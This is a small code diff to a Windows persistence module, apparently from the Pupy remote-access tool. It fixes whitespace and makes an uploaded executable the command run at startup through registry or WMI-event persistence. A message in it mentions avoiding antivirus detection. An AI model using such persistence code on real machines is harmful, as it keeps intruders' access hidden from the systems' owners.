@@ -94,7 +94,7 @@ class PersistenceModule(PupyModule):
                     self.info("persistence removed !")
                 else:
                     self.error("error removing registry persistence")
-            
+
             # removing persistency from wmi event
             elif args.method=="wmi":
                 self.info("removing wmi event ...")
@@ -127,11 +127,12 @@ class PersistenceModule(PupyModule):
                 pos+=chunk_size
             rf.close()
             self.success("upload successful")
+            cmd = remote_path
         elif args.cmd:
             cmd = args.cmd
         else:
             self.error("A command line or an executable is needed on windows (standard templates will get caught by the AV)")
-            return 
+            return
 
 
         if args.method=="registry":
@@ -150,5 +151,3 @@ class PersistenceModule(PupyModule):
                 self.success("persistence added using wmi!")
             else:
                 self.error("an error occured creating the wmi persistence, try to do it manually")
-
-
